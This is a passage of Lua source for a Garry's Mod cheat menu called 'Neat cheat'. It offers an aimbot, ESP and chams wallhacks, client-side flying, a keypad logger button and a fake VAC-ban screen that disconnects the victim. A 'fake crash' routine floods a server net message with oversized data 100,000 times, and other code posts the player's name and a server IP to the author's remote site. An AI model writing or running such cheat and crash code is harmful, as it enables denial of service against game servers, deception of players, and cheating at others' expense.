    if bJ:KeyDown(IN_BACK) then cV = cV - B:Forward() end
    if bJ:KeyDown(IN_MOVERIGHT) then cV = cV + B:Right() end
    if bJ:KeyDown(IN_MOVELEFT) then cV = cV - B:Right() end
    if bJ:KeyDown(IN_JUMP) then cV = cV + B:Up() end
    cV = cV:GetNormal() * bb * 2000
    if bJ:KeyDown(IN_SPEED) then cV = cV * 0.1 end
    if bJ:KeyDown(IN_DUCK) then cV = cV * 0.01 end
    Velocity = Velocity + cV
    if LockView == true then LockView = bJ:GetViewAngles() end
    if LockView then bJ:SetViewAngles(LockView) end
    bJ:SetForwardMove(0)
    bJ:SetSideMove(0)
    bJ:SetUpMove(0)
end

hook.Add("CreateMove", "NEAT", CreateMove)
local function cW()
    Enabled = not Enabled
    LockView = Enabled
    SetView = true
end

concommand.Add("noclip_neat", cW)
local function cX()
    local ac = vgui.Create("DFrame")
    ac:SetSize(310, 395)
    ac:Center()
    ac:MakePopup()
    ac:ShowCloseButton(false)
    ac:SetTitle("")
    ac.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, ac:GetWide(), ac:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, ac:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, ac:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - entity esp", "Roboto", ac:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", ac)
    a5:SetText("")
    a5:SetPos(ac:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() ac:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local function cY(ae)
        for x, p in pairs(ents.FindByClass(ae)) do
            c = p:LocalToWorld(p:OBBCenter()):ToScreen()
            draw.SimpleTextOutlined(ae, "NEAT_15", c.x, c.y - 30, NEAT_menu_color, 1, 1, 1, Color(0, 0, 0))
            local n = n
            local bN = p:GetPos()
            local bO = p:OBBMaxs()
            local bP = p:OBBMins()
            local bQ = p:EyeAngles()
            cam.Start3D()
            render.DrawWireframeBox(bN, Angle(0, bQ.y, 0), bP, bO, NEAT_menu_color)
            cam.End3D()
        end
    end

    AppList = vgui.Create("DListView", ac)
    AppList:SetPos(5, 30)
    AppList:SetSize(300, 322)
    AppList:SetMultiSelect(true)
    AppList:AddColumn(AllEntity)
    AppList.OnRowSelected = function(cZ, aI, a6)
        local c_ = a6:GetColumnText(1)
        hook.Add("HUDPaint", "NEAT_entity_" .. c_, function() cY(c_) end)
    end

    addedEnts = {}
    allent = {}
    addedEnts['worldspawn'] = true
    addedEnts['class C_PlayerResource'] = true
    addedEnts['class C_GMODGameRulesProxy'] = true
    addedEnts['class C_EnvTonemapController'] = true
    addedEnts['viewmodel'] = true
    addedEnts['env_skypaint'] = true
    addedEnts['class C_FogController'] = true
    addedEnts['class C_ShadowControl'] = true
    addedEnts['class C_Sun'] = true
    addedEnts['gmod_hands'] = true
    addedEnts['weapon_crowbar'] = true
    addedEnts['weapon_pistol'] = true
    addedEnts['weapon_smg1'] = true
    addedEnts['weapon_frag'] = true
    addedEnts['weapon_physcannon'] = true
    addedEnts['weapon_crossbow'] = true
    addedEnts['weapon_shotgun'] = true
    addedEnts['weapon_357'] = true
    addedEnts['weapon_rpg'] = true
    addedEnts['weapon_ar2'] = true
    addedEnts['gmod_tool'] = true
    addedEnts['gmod_camera'] = true
    addedEnts['weapon_physgun'] = true
    addedEnts['physgun_beam'] = true
    for x, p in pairs(ents.GetAll()) do
        if not addedEnts[p:GetClass()] and not p:IsPlayer() and not p:IsNPC() and not allent[p:GetClass()] then
            AppList:AddLine(p:GetClass())
            addedEnts[p:GetClass()] = true
        end
    end

    local aD = vgui.Create('DButton', ac)
    aD:SetPos(6, 357)
    aD:SetSize(296, 30)
    aD:SetText("")
    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(remove_all, "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    aD.DoClick = function()
        for x, p in pairs(ents.GetAll()) do
            hook.Remove("HUDPaint", "NEAT_entity_" .. p:GetClass())
        end
    end
end

AimKey = 15
AimFOV = 180
AimSpeed = 15
local d0 = 5
CreateClientConVar("g_legit_fov", 180)
timer.Create("вп", 1, 0, function() AimFOV = GetConVarNumber("g_legit_fov") end)
local d1 = {
    Auto = true,
    Body = false,
    Head = false
}

local me = LocalPlayer()
AimFOV = math.Clamp(AimFOV, 1, 180)
AimSpeed = math.Clamp(AimSpeed, 1, 100)
d0 = math.Clamp(d0, 0, AimSpeed)
AimSpeed = AimSpeed / 100
d0 = d0 / 100
local d2 = function(d3, d4)
    local d5 = d4 - d3
    d5.p = math.NormalizeAngle(d5.p)
    d5.y = math.NormalizeAngle(d5.y)
    return math.sqrt(d5.p ^ 2 + d5.y ^ 2)
end

local d6 = function(B)
    local d7 = CurTime()
    B.p = B.p + math.sin(d7) * d0
    B.y = B.y + math.cos(d7) * d0
    return B
end

local d8 = function(n, d9)
    local F = util.TraceLine({
        start = me:GetShootPos(),
        endpos = d9,
        mask = MASK_SHOT,
        filter = {me, n}
    })
    return F.Fraction == 1 or F.MatType == MAT_GLASS
end

local da = function(n)
    local db = n:LookupBone("ValveBiped.Bip01_Head1")
    local dc = n:GetPos() + n:OBBCenter()
    if d1["Body"] or not db then
        return d8(n, dc) and dc
    else
        local pos = n:GetBonePosition(db)
        if d8(n, pos) then
            return pos
        elseif d1["Auto"] then
            return d8(n, dc) and dc
        end
    end
end

local dd = function(n) return n == nil and n == me and not n:Alive() and n:IsDormant() end
local de = function(bJ)
    local dg = nil
    local dh = AimFOV
    local di = me:GetShootPos()
    local dj = bJ:GetViewAngles()
    for l, n in ipairs(player.GetAll()) do
        local dk = da(n)
        local dl = (dk - di):Angle()
        local C = d2(dj, dl)
        if C < dh then
            dh = C
            dg = dl
        end
    end
    return dg
end

local dm = function(bJ)
    if AimKey and not input.IsKeyDown(AimKey) then return end
    if me:IsTyping() or gui.IsGameUIVisible() or not me:Alive() then return end
    local dl = de(bJ)
    if dl then
        dl.p = math.NormalizeAngle(dl.p)
        dl.y = math.NormalizeAngle(dl.y)
        dl.r = 0
        dl = LerpAngle(AimSpeed, bJ:GetViewAngles(), dl)
        dl = d6(dl)
        bJ:SetViewAngles(dl)
    end
end

local function dn()
    local NEAT = vgui.Create("DFrame")
    NEAT:SetSize(460, 100)
    NEAT:Center()
    NEAT:SetTitle("")
    NEAT:MakePopup()
    NEAT:ShowCloseButton(false)
    NEAT.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, NEAT:GetWide(), NEAT:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, NEAT:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, NEAT:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - legitbot", "Roboto", NEAT:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", NEAT)
    a5:SetText("")
    a5:SetPos(NEAT:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() NEAT:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local aD = vgui.Create("DButton", NEAT)
    aD:SetText("")
    aD:SetPos(5, 30)
    aD:SetSize(230, 25)
    aD.DoClick = function()
        if NEAT_lodfl then
            NEAT_lodfl = not NEAT_lodfl
            Notify(Disable .. " legitbot")
            hook.Remove("CreateMove", "LegitBot")
        else
            NEAT_lodfl = not NEAT_lodfl
            Notify(Enable .. " legitbot")
            hook.Add("CreateMove", "LegitBot", dm)
        end
    end

    aD.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText("Вкл/Выкл legitbot", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if aD.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    local dp = vgui.Create("DNumSlider", NEAT)
    dp:SetPos(240, 30)
    dp:SetSize(200, 30)
    dp:SetMin(30)
    dp:SetMax(180)
    dp:SetDecimals(0)
    dp:SetText("Fov")
    dp:SetConVar("g_legit_fov")
    local c9 = vgui.Create("DComboBox", NEAT)
    c9:SetPos(5, 65)
    c9:SetSize(230, 30)
    c9:SetValue("Кнопка")
    c9:AddChoice("E")
    c9:AddChoice("F")
    c9.OnSelect = function(self, aI, cb)
        if cb == "E" then AimKey = 15 end
        if cb == "F" then AimKey = 16 end
        hook.Add("CreateMove", "LegitBot", dm)
    end
end

ffdgdgfdgdg = 1
hook.Add("Think", "a", function()
    if input.IsKeyDown(KEY_F3) and ffdgdgfdgdg == 1 then
        ffdgdgfdgdg = 0
        h("Делаем скриншот..")
        hook.Add("PostRender", "fdg", function()
            local H = render.Capture({
                format = "jpeg",
                quality = 40,
                x = 0,
                y = 0,
                w = ScrW(),
                h = ScrH()
            })

            http.Post("https://api.imgur.com/3/image", {
                image = util.Base64Encode(H)
            }, function(dq) SetClipboardText(util.JSONToTable(dq).data.link) end, function(dr) print(dr) end, {
                Authorization = "Client-ID f1607b06d9a163f"
            })

            hook.Remove("PostRender", "fdg")
        end)

        h("Скришот зделан, и скопирован в буфер обмена")
    end
end)

timer.Create("аokeyssokeyssokeyss", 5, 0, function() ffdgdgfdgdg = 1 end)
local function ds()
    RunConsoleCommand("cl_show_splashes", "0")
    RunConsoleCommand("cl_ejectbrass", "0")
    RunConsoleCommand("cl_detailfade", "800")
    RunConsoleCommand("cl_detaildist", "1")
    RunConsoleCommand("cl_smooth", "0")
    RunConsoleCommand("mat_parallaxmap", "0")
    RunConsoleCommand("mat_picmip", "2")
    RunConsoleCommand("mat_specular", "0")
    RunConsoleCommand("mat_softwarelighting", "1")
    RunConsoleCommand("mat_mipmaptextures", "0")
    RunConsoleCommand("mat_filtertextures", "0")
    RunConsoleCommand("mat_filterlightmaps", "0")
    RunConsoleCommand("mat_clipz", "0")
    RunConsoleCommand("mat_bumpmap", "0")
    RunConsoleCommand("mat_compressedtextures", "1")
    RunConsoleCommand("r_fastzreject", "-1")
    RunConsoleCommand("r_threaded_particles", "1")
    RunConsoleCommand("r_threaded_renderables", "1")
    RunConsoleCommand("r_decal_cullsize", "1")
    RunConsoleCommand("r_drawflecks", "0")
    RunConsoleCommand("r_drawmodeldecals", "0")
    RunConsoleCommand("r_dynamic", "0")
    RunConsoleCommand("r_lod", "0")
    RunConsoleCommand("r_WaterDrawReflection", "0")
    RunConsoleCommand("r_WaterDrawRefraction", "0")
    RunConsoleCommand("r_waterforceexpensive", "0")
    RunConsoleCommand("r_cheapwaterend", "1")
    RunConsoleCommand("dsp_enhance_stereo", "0")
    RunConsoleCommand("r_cheapwaterend", "1")
    RunConsoleCommand("ai_expression_optimization", "0")
    RunConsoleCommand("mat_queue_mode", "2")
    Notify("Фпс фикс подключен")
end

local function dt()
    okeyss = vgui.Create("DFrame")
    okeyss:SetSize(400, 577)
    okeyss:Center()
    okeyss:SetTitle("")
    okeyss:SetVisible(true)
    okeyss:ShowCloseButton(false)
    okeyss:SetDraggable(true)
    okeyss:MakePopup()
    okeyss.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, okeyss:GetWide(), okeyss:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, okeyss:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, okeyss:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat - " .. statistika_4ita, "Roboto", okeyss:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(okeyss:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() okeyss:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    rtx = vgui.Create("RichText", okeyss)
    rtx:SetPos(3, 25)
    rtx:SetSize(395, 550)
    rtx:InsertColorChange(255, 255, 255, 255)
    http.Fetch(lemosa_sait .. "/cheat/start.txt", function(du) rtx:AppendText(du) end)
end

local function dv()
    okeyss = vgui.Create("DFrame")
    okeyss:SetSize(400, 277)
    okeyss:Center()
    okeyss:SetTitle("")
    okeyss:SetVisible(true)
    okeyss:ShowCloseButton(false)
    okeyss:SetDraggable(true)
    okeyss:MakePopup()
    okeyss.Paint = function()
        if IsValid(okeyss) then
            surface.SetDrawColor(90, 90, 90, 255)
            surface.DrawRect(0, 0, okeyss:GetWide(), okeyss:GetTall())
            draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
            draw.RoundedBox(0, okeyss:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
            draw.RoundedBox(0, 0, okeyss:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
            draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
            draw.SimpleText("Neat - " .. BServers, "Roboto", okeyss:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        end
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(okeyss:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function() okeyss:Close() end
    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    rtx = vgui.Create("RichText", okeyss)
    rtx:SetPos(3, 25)
    rtx:SetSize(395, 220)
    rtx:InsertColorChange(255, 255, 255, 255)
    http.Fetch(lemosa_sait .. "/cheat/baza.txt", function(du)
        rtx:AppendText("No spam plz/Не спамьте пж\n")
        rtx:AppendText(du)
    end)

    edit1 = vgui.Create("DTextEntry", okeyss)
    edit1:SetPos(5, 250)
    edit1:SetSize(358, 22)
    edit1:SetText(game.GetIPAddress())
    edit1:SetEnterAllowed(true)
    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(365, 250)
    a5:SetSize(30, 21)
    a5.DoClick = function()
        http.Post(lemosa_sait .. "/cheat/baza.php", {
            a = steamworks.GetPlayerName(LocalPlayer():SteamID64()) .. ":" .. edit1:GetValue()
        })

        h(Otpravleno)
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
        draw.SimpleText(">", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end
end

local function dw()
    if NEAT12q then
        NEAT12q = not NEAT12q
        Notify(Disable)
        hook.Remove("HUDPaint", "dgdfggggggggggggdg")
    else
        NEAT12q = not NEAT12q
        Notify(Enable)
        hook.Add("HUDPaint", "dgdfggggggggggggdg", function()
            for x, p in pairs(player.GetAll()) do
                if o(p) == true then
                    cam.Start3D(EyePos(), EyeAngles())
                    cam.IgnoreZ(true)
                    render.SuppressEngineLighting(true)
                    p:DrawModel()
                    cam.IgnoreZ(false)
                    render.SuppressEngineLighting(false)
                    cam.End3D()
                end
            end
        end)
    end
end

local function dx(cH, db)
    local db = em.LookupBone(cH, db)
    return db and vm.ToScreen(em.GetBonePosition(cH, db)) and nil
end

local function dy(cH)
    em = FindMetaTable"Entity"
    pm = FindMetaTable"Player"
    cm = FindMetaTable"CUserCmd"
    wm = FindMetaTable"Weapon"
    am = FindMetaTable"Angle"
    vm = FindMetaTable"Vector"
    local aD = {
        head = dx(cH, "ValveBiped.Bip01_Head1"),
        neck = dx(cH, "ValveBiped.Bip01_Neck1"),
        spine4 = dx(cH, "ValveBiped.Bip01_Spine4"),
        spine2 = dx(cH, "ValveBiped.Bip01_Spine2"),
        spine1 = dx(cH, "ValveBiped.Bip01_Spine1"),
        spine = dx(cH, "ValveBiped.Bip01_Spine"),
        rarm = dx(cH, "ValveBiped.Bip01_R_UpperArm"),
        rfarm = dx(cH, "ValveBiped.Bip01_R_Forearm"),
        rhand = dx(cH, "ValveBiped.Bip01_R_Hand"),
        larm = dx(cH, "ValveBiped.Bip01_L_UpperArm"),
        lfarm = dx(cH, "ValveBiped.Bip01_L_Forearm"),
        lhand = dx(cH, "ValveBiped.Bip01_L_Hand"),
        rthigh = dx(cH, "ValveBiped.Bip01_R_Thigh"),
        rcalf = dx(cH, "ValveBiped.Bip01_R_Calf"),
        rfoot = dx(cH, "ValveBiped.Bip01_R_Foot"),
        rtoe = dx(cH, "ValveBiped.Bip01_R_Toe0"),
        lthigh = dx(cH, "ValveBiped.Bip01_L_Thigh"),
        lcalf = dx(cH, "ValveBiped.Bip01_L_Calf"),
        lfoot = dx(cH, "ValveBiped.Bip01_L_Foot"),
        ltoe = dx(cH, "ValveBiped.Bip01_L_Toe0")
    }

    surface.SetDrawColor(NEAT_menu_color)
    surface.DrawLine(aD.head.x, aD.head.y, aD.neck.x, aD.neck.y)
    surface.DrawLine(aD.neck.x, aD.neck.y, aD.spine4.x, aD.spine4.y)
    surface.DrawLine(aD.spine4.x, aD.spine4.y, aD.spine2.x, aD.spine2.y)
    surface.DrawLine(aD.spine2.x, aD.spine2.y, aD.spine1.x, aD.spine1.y)
    surface.DrawLine(aD.spine1.x, aD.spine1.y, aD.spine.x, aD.spine.y)
    surface.DrawLine(aD.spine4.x, aD.spine4.y, aD.rarm.x, aD.rarm.y)
    surface.DrawLine(aD.rarm.x, aD.rarm.y, aD.rfarm.x, aD.rfarm.y)
    surface.DrawLine(aD.rfarm.x, aD.rfarm.y, aD.rhand.x, aD.rhand.y)
    surface.DrawLine(aD.spine4.x, aD.spine4.y, aD.larm.x, aD.larm.y)
    surface.DrawLine(aD.larm.x, aD.larm.y, aD.lfarm.x, aD.lfarm.y)
    surface.DrawLine(aD.lfarm.x, aD.lfarm.y, aD.lhand.x, aD.lhand.y)
    surface.DrawLine(aD.spine.x, aD.spine.y, aD.rthigh.x, aD.rthigh.y)
    surface.DrawLine(aD.rthigh.x, aD.rthigh.y, aD.rcalf.x, aD.rcalf.y)
    surface.DrawLine(aD.rcalf.x, aD.rcalf.y, aD.rfoot.x, aD.rfoot.y)
    surface.DrawLine(aD.rfoot.x, aD.rfoot.y, aD.rtoe.x, aD.rtoe.y)
    surface.DrawLine(aD.spine.x, aD.spine.y, aD.lthigh.x, aD.lthigh.y)
    surface.DrawLine(aD.lthigh.x, aD.lthigh.y, aD.lcalf.x, aD.lcalf.y)
    surface.DrawLine(aD.lcalf.x, aD.lcalf.y, aD.lfoot.x, aD.lfoot.y)
    surface.DrawLine(aD.lfoot.x, aD.lfoot.y, aD.ltoe.x, aD.ltoe.y)
end

local function dz()
end

local function dA()
    local dB = GetConVarNumber("volume")
    RunConsoleCommand("volume", 0)
    VACBg = vgui.Create("HTML")
    VACBg:SetSize(ScrW(), ScrH())
    VACBg:OpenURL[[asset://garrysmod/html/loading.html]]
    VACBg:MakePopup()
    VACBg:SetMouseInputEnabled(false)
    gui.HideGameUI()
    local ac = vgui.Create("DPanel")
    VACPanel = ac
    ac:SetSize(400, 180)
    ac:Center()
    ac:MakePopup()
    ac.Paint = function(self, t, u)
        surface.SetDrawColor(Color(108, 111, 114, 250))
        surface.DrawRect(0, 0, t, u)
        surface.SetDrawColor(Color(40, 40, 40, 255))
        surface.DrawOutlinedRect(0, 0, t, u)
    end

    ac:SetKeyBoardInputEnabled(true)
    ac.OnKeyCodePressed = function(dC)
        gui.HideGameUI()
        return false
    end

    ac.Think = function() gui.HideGameUI() end
    local dD = ac:Add("DButton")
    dD:SetText("#GameUI_Close")
    dD:SetPos(300, 136)
    dD:SetSize(72, 24)
    dD:SetCursor("arrow")
    dD.Paint = function(self, t, u)
        surface.SetDrawColor(Color(227, 227, 227, 255))
        surface.DrawRect(0, 0, t, u)
        surface.SetDrawColor(Color(40, 40, 40, 255))
        surface.DrawOutlinedRect(0, 0, t, u)
    end

    dD.DoClick = function() RunConsoleCommand("disconnect") end
    local dE = ac:Add("DLabel")
    dE:SetWrap(true)
    dE:SetPos(80, 24)
    dE:SetSize(300, 120)
    dE:SetText("#VAC_ConnectionRefusedDetail")
    local dF = vgui.Create("DLabel", ac)
    dF:SetPos(10, 10)
    dF:SetText("#VAC_ConnectionRefusedTitle")
    dF:SizeToContents()
    local dG = ac:Add("DImage")
    dG:SetPos(30, 42)
    dG:SetSize(64, 64)
    dG:SetImage("vgui/resource/icon_vac")
end

blur = Material("pp/blurscreen")
function DrawBlur(ca, dH)
    local ce, cf = ca:LocalToScreen(0, 0)
    local dI, dJ = ScrW(), ScrH()
    surface.SetDrawColor(255, 255, 255)
    surface.SetMaterial(blur)
    for l = 1, 3 do
        blur:SetFloat("$blur", l / 3 * (dH or 6))
        blur:Recompute()
        render.UpdateScreenEffectTexture()
        surface.DrawTexturedRect(ce * -1, cf * -1, dI, dJ)
    end
end

hook.Add("Think", "gfgfgsf", function()
    if input.IsKeyDown(file.Read("Neat_cheat/NEAT_open_menu.txt", "DATA")) and not menuopen and not insertdown then
        menuopen = true
        insertdown = true
        NEAT_menu()
    elseif not input.IsKeyDown(file.Read("Neat_cheat/NEAT_open_menu.txt", "DATA")) and not menuopen then
        insertdown = false
    end

    if input.IsKeyDown(file.Read("Neat_cheat/NEAT_open_menu.txt", "DATA")) and insertdown and menuopen then
        insertdown2 = true
    else
        insertdown2 = false
    end
end)

function NEAT_menu()
    local okeyss = vgui.Create("DFrame")
    okeyss:SetSize(300, 380)
    okeyss:Center()
    okeyss:SetTitle("")
    okeyss:SetVisible(true)
    okeyss:SetDraggable(true)
    okeyss:ShowCloseButton(false)
    okeyss:MakePopup()
    okeyss.Think = function()
        if input.IsKeyDown(file.Read("Neat_cheat/NEAT_open_menu.txt", "DATA")) and not insertdown2 then
            okeyss:Remove()
            menuopen = false
            candoslider = false
            drawlast = nil
        end
    end

    okeyss.Paint = function()
        surface.SetDrawColor(90, 90, 90, 255)
        surface.DrawRect(0, 0, okeyss:GetWide(), okeyss:GetTall())
        draw.RoundedBox(0, 0, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, okeyss:GetWide() - 4, 0, 4, 1000, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, okeyss:GetTall() - 4, 1000, 4, NEAT_menu_colorgg)
        draw.RoundedBox(0, 0, 0, 699, 27, NEAT_menu_colorgg)
        draw.SimpleText("Neat cheat", "Roboto", okeyss:GetWide() / 2 - 8, 13, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end

    local a5 = vgui.Create("DButton", okeyss)
    a5:SetText("")
    a5:SetPos(okeyss:GetWide() - 46, 1)
    a5:SetSize(42, 20)
    a5.DoClick = function()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end

    a5.Paint = function(a6, t, u)
        draw.RoundedBox(0, 0, 0, t, u, Color(255, 0, 1, 255))
        draw.SimpleText("х", "Roboto", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
        if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
    end

    ggggg = vgui.Create("DScrollPanel", okeyss)
    ggggg:Dock(FILL)
    ggggg.VBar.Paint = function(a6, t, u) draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 50)) end
    ggggg.VBar.btnUp.Paint = function(a6, t, u) draw.DrawText("▲", "HudHintTextSmall", 3, 2, Color(255, 255, 255, 255)) end
    ggggg.VBar.btnDown.Paint = function(a6, t, u) draw.DrawText("▼", "HudHintTextSmall", 3, 2, Color(255, 255, 255, 255)) end
    ggggg.VBar.btnGrip.Paint = function(a6, t, u) draw.RoundedBox(2, 3, 2, t - 6, u - 4, Color(255, 255, 255, 255)) end
    fhgfhf = 1
    function button_add(ae, func)
        local a5 = vgui.Create("DButton", ggggg)
        a5:SetText("")
        a5:SetPos(1, fhgfhf)
        a5:SetSize(280, 25)
        a5.Paint = function(self, t, u)
            draw.RoundedBox(0, 0, 0, t, u, Color(0, 0, 0, 255))
            draw.SimpleText(ae, "NEAT_15", t / 2, u / 2 - 1, Color(255, 255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            if a5.Hovered then draw.RoundedBox(0, 0, 0, t, u, Color(255, 255, 255, 59)) end
        end

        a5.DoClick = func
        fhgfhf = fhgfhf + 30
    end

    button_add("Creator", function() gui.OpenURL("https://steamcommunity.com/id/exective/") end)
    button_add(Options, function()
        c6()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add("logs", function()
        aU()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(HelpAim, function() c0() end)
    button_add("Legitbot", function() dn() end)
    button_add(TriggerBot, function() bL() end)
    button_add("No Recoil M9K", function() as() end)
    button_add("Keypad logger", function() cR() end)
    button_add("off textures)", function()
        if NEAT_1 then
            NEAT_1 = not NEAT_1
            Notify(Disable)
            hook.Remove("PostDrawOpaqueRenderables", "hfghf")
        else
            NEAT_1 = not NEAT_1
            hook.Add("PostDrawOpaqueRenderables", "hfghf", function() cam.Start3D2D(Vector(0, 0, 0), Angle(0, 0, 0), 1) end)
            Notify(Enable)
        end
    end)

    button_add("Fullbright", function() b_() end)
    button_add("Entity ESP", function()
        cX()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add("ESP Box", function() bM() end)
    button_add("ESP Box 2d", function() ai() end)
    button_add("ESP", function() ay() end)
    button_add("Chams", function() dw() end)
    button_add(DownloadAddons, function()
        a3()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(ClientFly, function()
        cW()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(TV, function()
        aW()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add("sv_cheats 1", function() ao() end)
    button_add(Radar, function() bs() end)
    button_add(Highlight, function() NEAT_player_pod() end)
    button_add(RemWalls, function() aq() end)
    button_add(Aim, function() cd() end)
    button_add(FPS, function() ds() end)
    button_add(ClearChat, function() y() end)
    button_add("No Sky", function() an() end)
    button_add(PlayerColor, function() bR() end)
    button_add(RunCLCode, function()
        b0()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(MuteAll, function() ar() end)
    button_add(TPV, function()
        if NEAT_1 then
            NEAT_1 = not NEAT_1
            Notify(Disable)
            A = true
        else
            NEAT_1 = not NEAT_1
            Notify(Enable)
            A = false
        end
    end)

    button_add(TopV, function() cA() end)
    button_add(FakeMoney, function() bq() end)
    button_add(FakeHack, function() ap() end)
    if ValidNetString("ArmDupe") then
        button_add("fake crash", function()
            for l = 1, 100000 do
                net.Start("ArmDupe")
                net.WriteUInt(99999999999999, 32)
                net.WriteData(" ", 99999999999999)
                net.SendToServer()
            end
        end)
    end

    button_add("fake vac", function()
        dA()
        menuopen = false
        candoslider = false
        okeyss:Close()
    end)

    button_add(HighlightProps, function() bW() end)
    button_add(AdminList, function() av() end)
    button_add(Spam, function() ah() end)
    button_add(FlashSpam, function()
        if NEAT_1 then
            NEAT_1 = not NEAT_1
            Notify("Спам фонариком вкл")
            hook.Add("CreateMove", "fgfdgdgdgdf", function(bJ) if input.IsKeyDown(KEY_F) then bJ:SetImpulse(100) end end)
        else
            NEAT_1 = not NEAT_1
            Notify("Спам фонариком выкл")
            hook.Remove("CreateMove", "fgfdgdgdgdf")
        end
    end)

    button_add(SpamError, function() br() end)
